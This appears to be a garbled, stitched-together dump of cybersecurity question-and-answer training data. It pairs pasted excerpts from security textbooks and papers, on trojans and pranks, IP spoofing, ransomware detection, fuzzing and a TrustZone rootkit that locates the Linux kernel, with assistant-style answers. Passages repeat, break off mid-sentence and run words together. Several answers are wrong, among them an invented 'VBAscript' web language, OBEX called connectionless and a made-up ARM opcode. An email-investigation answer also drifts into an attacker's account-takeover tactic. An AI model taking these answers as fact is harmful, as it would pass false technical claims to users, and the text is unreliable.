It ensures that all data packets sent between two devices are received in the correct order and without errors. This makes TCP ideal for applications where data integrity and reliability are crucial, such as web browsing or email communication.\n\nOn the other hand, OBEX is a connectionless protocol designed specifically for exchanging small objects, like files or messages, between devices over Bluetooth. Unlike TCP, OBEX does not establish a dedicated connection before data transfer. Instead, it relies on the underlying Bluetooth connection to transmit individual data packets. This makes OBEX more efficient for small, ad hoc transfers, but less suitable for large, continuous data streams.\n\nIn summary, TCP is better suited for applications requiring high data reliability and large data transfers, while OBEX is more efficient for small, ad hoc transfers between devices over Bluetooth. In the context of your provided code snippet, it uses OBEX to send a file to a remote device via Bluetooth, demonstrating its application in this specific use case."}

These solutions typically rely on signature-based detection, which means they look for known patterns or signatures of malware in files and system processes.\n\nOn the other hand, virus-specific approaches focus on detecting and removing specific viruses or families of viruses. These solutions may use heuristic analysis or behavioral detection to identify new or unknown threats.\n\nThe text mentions a controversial case where a generic antivirus product, InVircible, was found to delete a legitimate data file due to an undocumented use of a temporary file with the same name. This incident highlights one of the potential downsides of using generic antivirus solutions - they can sometimes mistakenly flag and delete legitimate files or cause system instability.\n\nVirus-specific approaches, while more targeted, can be less effective against new or unknown threats since they don't have signatures or definitions for them yet. Therefore, a hybrid approach that combines both generic and virus-specific methods is often recommended for comprehensive malware protection.\n\nIt's important to note that the choice between generic and virus-specific approaches ultimately depends on the specific needs and resources of an organization. Factors such as the size and complexity of the IT infrastructure, the types of threats encountered, and the available budget and expertise should be considered when making this decision."}

PUPs include adware, browser toolbars, web  browser\u2013tracking programs, and others.

This allowed the researchers to detect potential flaws or vulnerabilities of a rooted  device and would be subjected to further analysis. IV. RESULTS AND KEY FINDING A.Questionnaire Results   Before the simulation process, the researchers have  conducted interviews via surveys with android phone users. They were given survey questionnaires in which they found out  their general knowledge about malicious threats such as  malware, trojans, and worms, and the acknowledgment of  rootkits and their effects on their respective devices. Upon seeing them it can be inferred that although most of the general  user of android knows or is aware of the existence of malware,  specifically trojans and worms, most do not fully educate themselves as the majority are no t aware of spyware and rootkits.  In addition, security breaches and attacks can also be caused by enabling applications or apps that come from different websites or sources. With this, as most users enable these installations, it  can be said that most users may be susceptible to harmful  applications that may contain malicious files or codes that could lead to a potential attack. With the lack of knowledge about spyware, they could unknowingly download or allow spyware  apps that could get personal information and data. B.

Miller2, George Kesidis2 1Meta2Pennsylvania State University ABSTRACT A backdoor or Trojan attack is an important type of data poi- soning attack against deep neural network (DNN) classi\ufb01ers, wherein the training dataset is poisoned with a small number of samples that each possess the backdoor pattern (usually a pattern that is either imperceptible or innocuous) and which are mislabeled to the attacker\u2019s target class. When trained on a backdoor-poisoned dataset, a DNN behaves normally on most benign test samples but makes incorrect predictions to the target class when the test sample has the backdoor pat- tern incorporated (i.e., contains a backdoor trigger). Here we focus on image classi\ufb01cation tasks and show that supervised training may build stronger association between the backdoor pattern and the associated target class than that between nor- mal features and the true class of origin. By contrast, self- supervised representation learning ignores the labels of sam- ples and learns a feature embedding based on images\u2019 se- mantic content. Using a feature embedding found by self- supervised representation learning, a data cleansing method, which combines sample \ufb01ltering and re-labeling, is devel- oped. Experiments on CIFAR-10 benchmark datasets show that our method achieves state-of-the-art performance in mit- igating backdoor attacks.

Such an attack is launched by poisoning a small batch of training samples from one or more source classes chosen by the attacker. Training samples are poisoned by embedding innocuous or impercep-\"The problem is to compare what the program does with the users expectations.You cannot determine the users expectations for a program.x0cCross Reference: All About Viruses by Dr. Alan Solomon can be found athttp://www.drsolomon.com/vircen/allabout.html.Anyone concerned with viruses (or who just wants to know more aboutvirus technology) should visit Dr. Solomons site athttp://www.drsolomon.com/.At days end, you can classify a trojan as this: any program that performs a hidden andunwanted function. This may come in any form. It might be a utility that purports toindex file directories or one that unlocks registration codes on software. It might be aword processor or a network utility. In short, a trojan could be anything (and could befound in anything) that you or your users introduce to the system.Where Do Trojans Come From?Trojans are created strictly by programmers. One does not get a trojan through any meansother than by accepting a trojaned file that was prepared by a programmer.\"no matter howfast you change the battery, there is a loss of power during that time, and, thereforeall the data is lost. Some computers, but by no means all, have a backup system thatgives you about ten minutes in which to change the battery without loss of data.The JPEG HoaxThe JPEG virus hoax is a straightforward prank, released on 1stApril of both 1994and 1995.which, if one is not care-ful, results in removing vital computer systems\u2019 programs such as operating systemsand boot programs. Pranks usually appear as scare messages, usually in the form ofmass e-mails warning of serious problems on a certain issue. Innocent people usu-ally read such e-mails and get worried.Cohen\u2019s definition does not requiredeliberate replication (and this would be difficult to build into his formal model).Note that many people use the term virus loosely to cover any sort of programthat tries to hide its possibly malicious function and/or tries to spread onto as manycomputers as possible, though some of these programs may more correctly be called\u201cworms\u201d or \u201cTrojan horses\u201d. Also be aware that what constitutes a \u201cprogram\u201d fora virus to infect may include a lot more than is at first obvious\u2014don\u2019t assume toomuch about what a virus can or can\u2019t do!These software \u201cpranks\u201d are very serious; they are spreading faster than they arebeing stopped, and even the least harmful of viruses could be life-threatening. Forexample, in the context of a hospital life-support system, a virus that \u201csimply\u201d stops acomputer and displays a message until a key is pressed could be fatal. Further, viruswriters cannot halt the spread of their creations, even if they wanted to.A spoof is a hoax or prank, and IP spoofingmeans to deliberately construct an IP packet with a falsified source address.NOTE We carve out an exception here for Network Address Translation (NAT) operations onIP packets which alter source addresses (such as commonly provided by firewalls to shieldinternal networks behind a single external address). Not to be confused with IP spoof-ing, NAT is a legitimate networking function, whereas concealing an attack with afalsified source address is not.When it comes to communications over IP, there is no built-in restrictionon the source address of a packet. By using a raw socket (a low-level program-ming API to craft packets according to certain criteria), an IP packet canbe sent with an arbitrary source address. If the source address is nonsensicalin the context of the local network (for example, if the source is an IP onVerizon\u2019s network but the packet is really being sent from Comcast\u2019s network),the packet is said to be spoofed. Administratorsstudents in mainframe days, mimicked thescreen display and the prompts of the normal login program. They often passed theusername and password along to the valid login program at the same time as theycaptured the user data. Other Trojans may or may not contain actual code that doeswhat the Trojan is supposed to do, while performing additional and unpleasant actsthat the victim does not expect. Many distinguish between Trojans and joke or prankprograms on the basis that Trojans are always malicious.\"A Trojan horse is typically acquired by downloading aprogram that seems safe or promises something like free online time. Once it isdownloaded and executed, the malicious code begins to work. The differencebetween Trojan horses and viruses is that Trojan horses do not replicate orspread on their own. They can only be transmitted intentionally via email, disk, ora download directly onto a computer.x83Like viruses, worms replicate themselves. However, instead of spreading from file tofile, they spread from computer to computer, infecting an entire network. Wormscopy themselves from one computer to another over a network (using email, forexample). Because worms dont require human interaction to replicate, they canspread much more rapidly than computer viruses.To guard against this horde of malicious software that now wanders the electronic planet,many commercial organizations have developed software products that attempt to detectthese malware programs before they have a chance to do any\"each of them, how to tell them apart, how you can identify them, and common techniques  used in combatting them. Domain 1.0, Threats, Attacks, and Vulnerabilities of the SY0-601 exam objec - tives introduces many types of malware and asks you to analyze potential  indicators to determine the type of attack. When you tackle malware-based  questions, you will need to know the distinctive characteristics of each type  of malware and what might help you tell them apart. For example, a Trojan  is disguised as legitimate software, whereas ransomware will be aimed at  getting payment from a victim. As you read this section, remember to pay  attention to the differences between each type of malware and how you  would answer questions about them on the exam!Malware  47 Ransomware Ransomware  is malware that takes over a computer and then demands a ransom. There are  many types of ransomware, including crypto malware, which encrypts files and then holds  them hostage until a ransom is paid. Other ransomware techniques include threatening to  report the user to law enforcement due to pirated software or pornography, or threatening  to expose sensitive information or pictures from the victim\u2019s hard drive or device. One of the most important defenses against ransomware is an effective backup system  that stores files in a separate location that will not be impacted if the system or device it  backs up is infected and encrypted by ransomware. Organizations that are preparing to  deal with ransomware need to determine what their response will be; in some cases, pay - ing ransoms has resulted in files being returned, and in others attackers merely demanded  more money. Some ransomware has been defeated, and defenders may be able to use a  preexisting decryption tool to restore files. Antivirus and antimalware pro - viders as well as others in the security community provide anti-ransomware  tools. Trojansentry in the virus field is Parascan,the paranoid scanner. It pretends to find large numbers of infected files, although it does not actually checkfor any infections.Generally speaking, pranks that create some kind of announcement are not malware; viruses that generatea screen or audio display are actually quite rare. The distinction between jokes and Trojans is harder to make,but pranks are intended for amusement.None of us has ever seen this virus,although one of us has been assured that it really exists. There have been commerciallyproduced joke packages offering \u201cStupid Mac (or PC) Tricks\u201d. There are countlesspranks available as shareware or freeware. Some make the computer appear to insultthe user; some use sound effects or voices; some use special visual effects. A commoncharacteristic of such pranks is that the computer is, in some way, apparently non-functional. Many pretend to have detected some kind of fault in the computer (andsome pretend to rectify such faults, of course making things worse). One such programin our own field was PARASCAN, the paranoid scanner. This reported large numbersof very strange viral programs, none of which, oddly, have ever appeared on theWildList.It can be argued that, aside from temporary aberrations of heart rate and bloodpressure, pranks do no damage, and that they can be distinguished from Trojans onthat basis.

Further, viruswriters cannot halt the spread of their creations, even if they wanted to.A spoof is a hoax or prank, and IP spoofingmeans to deliberately construct an IP packet with a falsified source address.NOTE We carve out an exception here for Network Address Translation (NAT) operations onIP packets which alter source addresses (such as commonly provided by firewalls to shieldinternal networks behind a single external address). Not to be confused with IP spoof-ing, NAT is a legitimate networking function, whereas concealing an attack with afalsified source address is not.When it comes to communications over IP, there is no built-in restrictionon the source address of a packet. By using a raw socket (a low-level program-ming API to craft packets according to certain criteria), an IP packet canbe sent with an arbitrary source address. If the source address is nonsensicalin the context of the local network (for example, if the source is an IP onVerizon\u2019s network but the packet is really being sent from Comcast\u2019s network),the packet is said to be spoofed. Administratorsstudents in mainframe days, mimicked thescreen display and the prompts of the normal login program. They often passed theusername and password along to the valid login program at the same time as theycaptured the user data. Other Trojans may or may not contain actual code that doeswhat the Trojan is supposed to do, while performing additional and unpleasant actsthat the victim does not expect. Many distinguish between Trojans and joke or prankprograms on the basis that Trojans are always malicious.\"A Trojan horse is typically acquired by downloading aprogram that seems safe or promises something like free online time. Once it isdownloaded and executed, the malicious code begins to work. The differencebetween Trojan horses and viruses is that Trojan horses do not replicate orspread on their own. They can only be transmitted intentionally via email, disk, ora download directly onto a computer.x83Like viruses, worms replicate themselves. However, instead of spreading from file tofile, they spread from computer to computer, infecting an entire network. Wormscopy themselves from one computer to another over a network (using email, forexample). Because worms dont require human interaction to replicate, they canspread much more rapidly than computer viruses.To guard against this horde of malicious software that now wanders the electronic planet,many commercial organizations have developed software products that attempt to detectthese malware programs before they have a chance to do any\"each of them, how to tell them apart, how you can identify them, and common techniques  used in combatting them. Domain 1.0, Threats, Attacks, and Vulnerabilities of the SY0-601 exam objec - tives introduces many types of malware and asks you to analyze potential  indicators to determine the type of attack. When you tackle malware-based  questions, you will need to know the distinctive characteristics of each type  of malware and what might help you tell them apart. For example, a Trojan  is disguised as legitimate software, whereas ransomware will be aimed at  getting payment from a victim. As you read this section, remember to pay  attention to the differences between each type of malware and how you  would answer questions about them on the exam!Malware  47 Ransomware Ransomware  is malware that takes over a computer and then demands a ransom. There are  many types of ransomware, including crypto malware, which encrypts files and then holds  them hostage until a ransom is paid. Other ransomware techniques include threatening to  report the user to law enforcement due to pirated software or pornography, or threatening  to expose sensitive information or pictures from the victim\u2019s hard drive or device. One of the most important defenses against ransomware is an effective backup system  that stores files in a separate location that will not be impacted if the system or device it  backs up is infected and encrypted by ransomware. Organizations that are preparing to  deal with ransomware need to determine what their response will be; in some cases, pay - ing ransoms has resulted in files being returned, and in others attackers merely demanded  more money. Some ransomware has been defeated, and defenders may be able to use a  preexisting decryption tool to restore files. Antivirus and antimalware pro - viders as well as others in the security community provide anti-ransomware  tools. Trojansentry in the virus field is Parascan,the paranoid scanner. It pretends to find large numbers of infected files, although it does not actually checkfor any infections.Generally speaking, pranks that create some kind of announcement are not malware; viruses that generatea screen or audio display are actually quite rare. The distinction between jokes and Trojans is harder to make,but pranks are intended for amusement.None of us has ever seen this virus,although one of us has been assured that it really exists. There have been commerciallyproduced joke packages offering \u201cStupid Mac (or PC) Tricks\u201d. There are countlesspranks available as shareware or freeware. Some make the computer appear to insultthe user; some use sound effects or voices; some use special visual effects. A commoncharacteristic of such pranks is that the computer is, in some way, apparently non-functional. Many pretend to have detected some kind of fault in the computer (andsome pretend to rectify such faults, of course making things worse). One such programin our own field was PARASCAN, the paranoid scanner. This reported large numbersof very strange viral programs, none of which, oddly, have ever appeared on theWildList.It can be argued that, aside from temporary aberrations of heart rate and bloodpressure, pranks do no damage, and that they can be distinguished from Trojans onthat basis. However, some researchers refer to                   Question: 'What is the main difference between a Trojan and a Prank?'[/INST] The main difference between a Trojan and a Prank is that a Trojan is a type of malware that disguises itself as a legitimate program to gain unauthorized access to a system and perform malicious activities, while a Prank is a harmless program or hoax designed to amuse or deceive the user without causing any real harm to the system. While both may involve deceit and manipulation, the intentions and consequences of each are vastly different."}

The primary goal of a boot-sector virus is to spread itself to other computers by infecting their boot sectors when they read the infected storage device.\n\nOn the other hand, BSI (British Standards Institution) is an organization that develops and publishes various standards for different industries, including information technology, healthcare, construction, and others.

A VBA macro is a series of automated tasks recorded in Visual Basic for Applications (VBA), which can be played back to perform specific functions in an Office application like Excel or Word. Macros are typically used for automating repetitive tasks and are stored as part of the document or template file.\n\nOn the other hand, VBAscript is a lightweight, interpreted scripting language developed by Microsoft that can be used to add interactivity and dynamic content to websites and applications. VBAscript is not limited to Office applications and can be used in various contexts, including web development and client-side scripting in Internet Explorer.\n\nWhile both VBA macro and VBAscript use the same underlying language (Visual Basic for Applications), they serve different purposes and have distinct features. For example, VBA macro is primarily used for automating tasks in Office applications, while VBAscript is used for adding functionality to websites and applications, as well as for creating standalone scripts. Additionally, VBA macro requires the presence of an Office application to run, whereas VBAscript can be executed directly in a web browser or other environments without requiring any additional software."}

When a macro is buried in a .DOC or .XLS file, it becomes an embedded object within the document or spreadsheet.

Macro viruses are self-replicating malicious programs that use macros or code inside word processing software or other tools to spread. They are OS independent and can infect applications that run on different operating systems as long as they have macro capabilities. Macro viruses rely on users opening infected documents or macros to spread, and they can modify other macros or components of infected files during the infection process."}

Decoding tree    2) Selectable ISS  In some processors, several instructions might have the  same opcode as the opcode is completed by an external  information. For example, in the ARMV5 architecture, the  T bit in the CPSR register points out the fact that the  fetched instruction is 16 bits or 32 bits.  We added a version  attribute to the instructions. Then,  our tool generates several decoders if there are several version values. The variable in the nML description which  defines which decoder should be used is defined in the command line of the tool.   Considering the ARM processor, we have:  reg Ucpsr [1, card(32)]  reg T_Bit[1, card(1)] alias Ucpsr[5]    op arm_ver(ar :ARM)   syntax = ar.syntax ;   image = ar.image    action = ar.action    version = \u00ab 0 \u00bb   op ARM = ALU_arm | Branch_arm  op thumb_ver (th :THUMB)   syntax = th.syntax   image = th.image    action = th.action    version = \u00ab 1 \u00bb   op THUMB _ ALU_thumb | Branch_thumb    This can be easily extended to more than 2 instruction  sets, for example a processor with several coprocessors or  configurable processors.  F. Examples of use of the predecode attribute  This paragraph illustrates the use of the predecode  attribute in order to disassemble correctly and factorize the  description.  1) ARM architecture  We illustrate the use of the predecode attribute through  one of the addressing modes of the ARM architecture.  In the ARM architecture it is possible to write an  instruction such as:  ADD R5,R6,R7, ROR #2  In this instruction, R7 content is rotated right by 2 before  being added to R6, the result being stored in R5. However,  ROR #0  is in fact RRX.probability. 2) Finding the Initial Page Table: A page table walk can be used as optimization of a bruteforce search over the full theoretical memory address space. Iterating over the page tables requires knowledge about the location of the initial page table (called swapper_pg_dir on Linux). Instructions of the kernel are resident in memory after the system has booted up. Parsing those instructions can reveal additional information about the compilation-dependent properties of the kernel. Di- rectly after the assembly instruction forming the UEFI header, execution jumps to the primary entrypoint represented by the symbol primary_entry via the unconditional branch instruction b. Compilation adds the relative address of the primary_entry symbol to the binstruction. Opcodes of the jump instruction are parsed to calculate the target address [26]. According to the ARM64 Linux linker script, the initial page table is located directly before the primary_entry symbol [54]. Our rootkit traverses the memory space backwards until a non-zero page is encountered. The \ufb01rst non-zero page before primary_entry is the swapper_pg_dir symbol. 3) Page Table Walk: Subsection II-A explained the fun- damentals of the Armv8 virtual memory system. Once the initial page table is identi\ufb01ed, the rootkit maps it into the secure world memory. We inspect each 64-bit value of the page table separately and interpret it according to the architecture reference manual [26]. To cover all translation levels, we apply the interpretation recursively. Memory blocks and pages contain the actual data and compose the memory regions to be searched. Addresses used by this scheme to refer to pages, tables and blocks are physical addresses, i.e., we do not require further processing to map them into the secure world address space [26]. Memory blocks have a \ufb01xed size that depends on the translation granule size. While our proof-of-concept rootkit was extensively tested with 4KB pages, the implementationtel PT software decoder acts like a just-in-time decoder , which means that code sections are only considered if they are executed according to the decoded trace data. To optimize further look-ups, all disassembled code sec- tions are cached. In addition, we simply ignore packets that are not relevant for our use case. Since our PT decoder is part of QEMU-PT, trace data is directly processed if the ToPA base region is \ufb01lled. The decoding process is applied in-place since the buffer is directly accessible from user space via mmapHI . Un- like other Intel PT drivers, we do not need to store large amounts of trace data in memory or on storage devices for post-mortem decoding. Eventually, the decoded trace data is translated to the AFL bitmap format. 4.3 AFL Fuzzing Logic We give a brief description of the fuzzing parts of AFL because the logic we use to perform scheduling and mu- tations closely follows that of AFL. The most important aspect of AFL is the bitmap used to trace which basic block transitions where encountered. Each basic block has a randomly assigned ID, and each transition from ba- sic block Ato another basic block Bis assigned an offset into the bitmap according to the following formula:(id(A)/2\u2295id(B))%SIZE _OF_BITMAP Instead of the compile-time random, kAFL uses the addresses of the basic blocks. Each time the transition is observed, the corresponding byte in the bitmap is incre- mented. After \ufb01nishing the fuzzing iteration, each entry of the bitmap is rounded such that only the highest bit re- mains set. Then the bitmap is compared with the global static bitmap to see if any new bit was found. If a new bit was found, it is added to the global bitmap and the input that triggered the new bit is added to the queue. When a new interesting input is found, a deterministic stage is executed that tries to mutate each byte individually. Once the deterministic stage is \ufb01nished, the non- deterministic phase is started. During this non-are provided next. 1) Finding the Kernel Image: First, the kernel image needs to be found. A bruteforce search is the most primitive way of \ufb01nding speci\ufb01c memory regions. Every reasonable location in the theoretical address space is checked whether it is mapped by the normal world kernel and its content matches a speci\ufb01ed sequence of bytes. In the default con\ufb01guration of OP-TEE version 3.11.0, the normal world kernel image is loaded at a randomized address via KASLR [50], [51]. Magic bytes of the Uni\ufb01ed Extensible Firmware Interface (UEFI) header are used as distinctive start of the kernel image. Iterating the complete theoretical address space when using 48 address bits is a signi\ufb01cant computational effort, especially on low-powered mobile devices. Given current devices, only a fraction of the theoretically addressable memory is physically available. Alignment restrictions are used to decrease the amount of addresses to check and speed up the bruteforce search. Starting from the normal world memory base at physical address0x40000000 [52], we map memory pages to the 268 Authorized licensed use limited to: University of Pisa. Downloaded on December 08,2023 at 17:01:45 UTC from IEEE Xplore.  Restrictions apply.secure world one by one. The kernel image and its leading UEFI header is aligned to a 64KB ( 216) boundary. Considering this limitation, the theoretical number of addresses to check can be reduced from 248to232. At the time of writing, opcodes of a speci\ufb01c assembly instruction right at the beginning of the image form the magic bytes of the UEFI header of the ARM64 Linux image. Leading bytes of each page are checked for the opcodes representing the UEFI header [53]. If the value is found, the start of the kernel image was identi\ufb01ed with high probability. 2) Finding the Initial Page Table: A page table walk can be used as optimization of a bruteforce search over the full theoretical memory address space. Iterating over the pagethen disassembles1 the executable \ufb01le and obtains the assembly code inFigure 11.10. The signi\ufb01cant information in this code is the \u201cSerial number is cor-rect\u201d message, which appears at address 0x401034.(Itis commonly said, and attributed to Edgser W. Djkstra, that if debugging is the process of removing bugs, thenprogramming must be the process of putting them in.)The Programming ProcessIn the beginning, of course, programmers created object (or machine, or binary) files directly. The operatinginstructions (opcodes) for the computer and any necessary arguments or data were presented to the machinein the form that was needed to get it to process properly. Assembly language was produced to help with thisprocess; although there is a fairly direct correspondence between the assembly mnemonics and specific opcodes,at least the assembly files are formatted in a way that is relatively easy to read, rather than being strings ofhexadecimal or binary numbers.With the advent of high- or at least higher-level languages, programming language systems split into twotypes. High-level languages are those where the source code is somewhat more comprehensible to people.Those who work with C or APL may\"", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

In the default con\ufb01guration of OP-TEE version 3.11.0, the normal world kernel image is loaded at a randomized address via KASLR [50], [51]. Magic bytes of the Uni\ufb01ed Extensible Firmware Interface (UEFI) header are used as distinctive start of the kernel image. Iterating the complete theoretical address space when using 48 address bits is a signi\ufb01cant computational effort, especially on low-powered mobile devices. Given current devices, only a fraction of the theoretically addressable memory is physically available. Alignment restrictions are used to decrease the amount of addresses to check and speed up the bruteforce search. Starting from the normal world memory base at physical address0x40000000 [52], we map memory pages to the 268 Authorized licensed use limited to: University of Pisa. Downloaded on December 08,2023 at 17:01:45 UTC from IEEE Xplore.  Restrictions apply.secure world one by one. The kernel image and its leading UEFI header is aligned to a 64KB ( 216) boundary. Considering this limitation, the theoretical number of addresses to check can be reduced from 248to232. At the time of writing, opcodes of a speci\ufb01c assembly instruction right at the beginning of the image form the magic bytes of the UEFI header of the ARM64 Linux image. Leading bytes of each page are checked for the opcodes representing the UEFI header [53]. If the value is found, the start of the kernel image was identi\ufb01ed with high probability. 2) Finding the Initial Page Table: A page table walk can be used as optimization of a bruteforce search over the full theoretical memory address space. Iterating over the pagethen disassembles1 the executable \ufb01le and obtains the assembly code inFigure 11.10. The signi\ufb01cant information in this code is the \u201cSerial number is cor-rect\u201d message, which appears at address 0x401034.(Itis commonly said, and attributed to Edgser W. Djkstra, that if debugging is the process of removing bugs, thenprogramming must be the process of putting them in.)The Programming ProcessIn the beginning, of course, programmers created object (or machine, or binary) files directly. The operatinginstructions (opcodes) for the computer and any necessary arguments or data were presented to the machinein the form that was needed to get it to process properly. Assembly language was produced to help with thisprocess; although there is a fairly direct correspondence between the assembly mnemonics and specific opcodes,at least the assembly files are formatted in a way that is relatively easy to read, rather than being strings ofhexadecimal or binary numbers.With the advent of high- or at least higher-level languages, programming language systems split into twotypes. High-level languages are those where the source code is somewhat more comprehensible to people.Those who work with C or APL may\"                   Question: 'What is a fairly direct correspondence between assembly mnemonics and specific opcodes?'[/INST] A fairly direct correspondence exists between assembly mnemonics and specific opcodes because each assembly mnemonic represents a specific machine instruction, and each machine instruction has a unique opcode. The assembly mnemonic is a human-readable representation of the machine instruction, while the opcode is the binary representation that the computer's processor uses to execute the instruction. For example, the assembly mnemonic \"ADD\" corresponds to the opcode 0x01 for adding two registers in the ARM architecture."}

Here are some ways this can be done:\n\n1. Email header information: By obtaining a court order or a civil complaint, investigators can access the log files from the email server to determine the sender's IP address and other header information such as recipient, date, and time. This information can help investigators track down the physical location of the suspect.\n2. Email content: In some cases, investigators may be able to access the actual contents of the emails with a valid search warrant or subpoena. This can provide valuable evidence related to the crime under investigation.\n3. Domain name ownership: Investigators can use specialized tools and websites like arin.net to validate and find the person owning a domain name associated with a suspect's email account.\n4. Social media and other online accounts: Suspects may use the same email address or other identifying information across multiple online accounts. Investigators can use this information to gather additional intelligence and potentially link the suspect to other crimes or criminal organizations.\n5. Self-service password resets: Many web applications, including email services and financial institutions, rely on personal information known only to the legitimate user to reset passwords. An attacker who gains access to a suspect's email account may be able to use this information to reset other passwords and gain further access to sensitive information.\n\nOverall, email account monitoring can provide investigators with valuable intelligence related to criminal activities, including the identity of the suspect, their location, and any potential co-conspirators or accomplices. However, it is important to note that all investigative activities must be conducted in accordance with applicable laws and regulations, and any obtained information must be handled with care to protect privacy and confidentiality."}

Flow records provide detailed information about network traffic, including the source and destination IP addresses, the type of traffic (TCP or UDP), the protocol being used, the port numbers, the time and duration of each connection, and the amount of data transmitted. This information can help network engineers optimize network performance by identifying bottlenecks and areas of high traffic. For investigators, flow records can be used to investigate security incidents, identify unauthorized access attempts, and track down sources of malware infections. The ability to analyze this data over extended periods can also help detect anomalous behavior and potential insider threats. Additionally, having flow records available can aid in incident response and forensic analysis during investigations."}

In manycircles, however, a network monitor is a device or system that collects statistics about the network.\u00a9 2004 by CRC Press LLCx0cAlthough the content of the communication is available for interpretation, it is typically ignored in lieuof various measurements and statistics. These metrics are used to scrutinize the fundamental health ofthe network.On the other hand, a sniffer is a system or device that collects data from various forms of communicationswith the simple goal of obtaining the data and traffic patterns, which can be used for dark purposes. To alleviateany interpretation issues, the term \u201csniffer\u201d best fits the overall goal of explaining the security aspects of datainterception.The essence of a sniffer is quite simple; theDefender. So when IT people are discussing Defender, it\u2019s important that they specify which  version they are talking about. I am going to talk about Azure\u2019s version of Windows Defender  and the benefits that it provides to organizations. Your organization\u2019s IT department can have even better threat protection when they combine  Azure Windows Defender Advanced Threat Protection (Windows Defender ATP) with Azure  Advanced Threat Protection (Azure ATP) as shown in Figurexa017.9. Figurexa017.9 was taken directly  from Microsoft\u2019s website and it shows all of the different ways Azure ATP and Windows  Defender ATP can work together. Azure ATP allows organizations to monitor domain controller traffic while Windows  Defender ATP allows organizations to monitor endpoints (for example, user\u2019s devices).  Organizations can use both of these defenses together for the best possible protection and both of  can be managed by using a single Azure interface. When deciding to integrate Azure ATP and Windows Defender ATP together, you get the  benefits of both systems working together. Some of these benefits include: Endpoint Behavioral Sensors Endpoint behavioral sensors are sensors that are built into the  Windows operating system and these sensors gather and process behavioral data for things  like the registry, files, processors, and communications. This data is then sent to the Windows  Defender ATP . Azure ATP Sensors and Stand- Alone Sensors These sensors can be placed directly onto  your domain controllers or they can be set up to port mirror directly from your domain  controller to Azure ATP . These sensors have the ability to collect and parse traffic for multiple  protocols that work with authentication, authorization, or just for informational gathering. Threat Intelligence Threat intelligence comprises multiple Microsoft tools, security groups,  and third- party threat defending partners. Threat intelligence allows Windows Defender ATPand corresponding ransomware families. Faris et al.

Raw API call sequences and permissions are used to capture ransomware patterns and build the framework. Abdullah et al. [86] performed dynamic analysis to cap- ture the system calls. These features were fed to Random Forest among other machine learning algorithms to detect and classify the samples. Almomani et al. [76] introduced a new detection approach for Android ransomware, based on machine learning techniques. Their study was made on Android Version 11, API level 30, and used a number of pre- dictive models for Android ransomware. The results showed 98.3% accuracy even after reducing 26% of the features. Almomani et al. [94] proposed a detection model for the Android platform based on machine learning. Ransomware samples were decompiled and a collection of features were extracted. A variety of oversampling algorithms were applied to the imbalanced dataset. c: OTHER PLATFORMS A novel ransomware detection model was presented by Al-Hawareh et al. [40] for IIoT systems.

Traditional security measures are insufficient to  counter sophisticated cyber attacks. Intrusion Detection Systems  (IDS) have emerged as crucial tools for monitoring network  traffic, detecting unauthorized access, data breaches, and  malicious activities. To address the complexity of network traffic  and enhance detection accuracy, machine learning techniques  have become increasingly essential. This paper presents a  comprehensive description of an IDS specifically designed for  network environments, combining packet sniffing with the power  of Random Forest Classification. The proposed system utilizes a  primary firewall to redirect Internet traffic to secondary  firewalls, safeguarding distinct network segments. Leveraging  Snort, a renowned intrusion detection system, in conjunction  with Random Forest Classification, enables meticulous filtering  and analysis of captured traffic for intrusion detection. The  system continuously monitors detected intrusions and promptly  alerts network administrators when predefined thresholds are  surpassed. Performance evaluation using a comprehensive  dataset demonstrates the systems effectiveness in accurately  detecting various intrusion types, including port scanning, denial- of-service attacks, and SQL injection. The system achieves high  accuracy rates while minimizing false positives. Moreover, the  paper highlights the strengths of the system, such as early\"Because ofthis, numerous service providers offer managed network DDoS protection, hosting DDoSprotection, peering point DDoS protection, and infrastructure protection services.

In manycircles, however, a network monitor is a device or system that collects statistics about the network.\u00a9 2004 by CRC Press LLCx0cAlthough the content of the communication is available for interpretation, it is typically ignored in lieuof various measurements and statistics. These metrics are used to scrutinize the fundamental health ofthe network.On the other hand, a sniffer is a system or device that collects data from various forms of communicationswith the simple goal of obtaining the data and traffic patterns, which can be used for dark purposes. To alleviateany interpretation issues, the term \u201csniffer\u201d best fits the overall goal of explaining the security aspects of datainterception.The essence of a sniffer is quite simple; theDefender. So when IT people are discussing Defender, it\u2019s important that they specify which  version they are talking about. I am going to talk about Azure\u2019s version of Windows Defender  and the benefits that it provides to organizations. Your organization\u2019s IT department can have even better threat protection when they combine  Azure Windows Defender Advanced Threat Protection (Windows Defender ATP) with Azure  Advanced Threat Protection (Azure ATP) as shown in Figurexa017.9. Figurexa017.9 was taken directly  from Microsoft\u2019s website and it shows all of the different ways Azure ATP and Windows  Defender ATP can work together. Azure ATP allows organizations to monitor domain controller traffic while Windows  Defender ATP allows organizations to monitor endpoints (for example, user\u2019s devices).  Organizations can use both of these defenses together for the best possible protection and both of  can be managed by using a single Azure interface. When deciding to integrate Azure ATP and Windows Defender ATP together, you get the  benefits of both systems working together. Some of these benefits include: Endpoint Behavioral Sensors Endpoint behavioral sensors are sensors that are built into the  Windows operating system and these sensors gather and process behavioral data for things  like the registry, files, processors, and communications. This data is then sent to the Windows  Defender ATP . Azure ATP Sensors and Stand- Alone Sensors These sensors can be placed directly onto  your domain controllers or they can be set up to port mirror directly from your domain  controller to Azure ATP . These sensors have the ability to collect and parse traffic for multiple  protocols that work with authentication, authorization, or just for informational gathering. Threat Intelligence Threat intelligence comprises multiple Microsoft tools, security groups,  and third- party threat defending partners. Threat intelligence allows Windows Defender ATPand corresponding ransomware families. Faris et al. [85] proposed an Android ransomware detection framework using a combination of metaheuristic and machine learning meth- ods. Raw API call sequences and permissions are used to capture ransomware patterns and build the framework. Abdullah et al. [86] performed dynamic analysis to cap- ture the system calls. These features were fed to Random Forest among other machine learning algorithms to detect and classify the samples. Almomani et al. [76] introduced a new detection approach for Android ransomware, based on machine learning techniques. Their study was made on Android Version 11, API level 30, and used a number of pre- dictive models for Android ransomware. The results showed 98.3% accuracy even after reducing 26% of the features. Almomani et al. [94] proposed a detection model for the Android platform based on machine learning. Ransomware samples were decompiled and a collection of features were extracted. A variety of oversampling algorithms were applied to the imbalanced dataset. c: OTHER PLATFORMS A novel ransomware detection model was presented by Al-Hawareh et al. [40] for IIoT systems. The model uti- lizes a deep learning approach along with Asynchronous Peer-to-Peer Federated Learning (AP2PFL) to provide highefficiency in detection. Chadha and Kumar [43] implemented a model that focused on discovering domains used by ran- somware. Specifically, their system predicted the domains by using a real data set containing 131 malicious domains distributed into four groups. Cusack et al. [46] developed a new tool, called, programmable 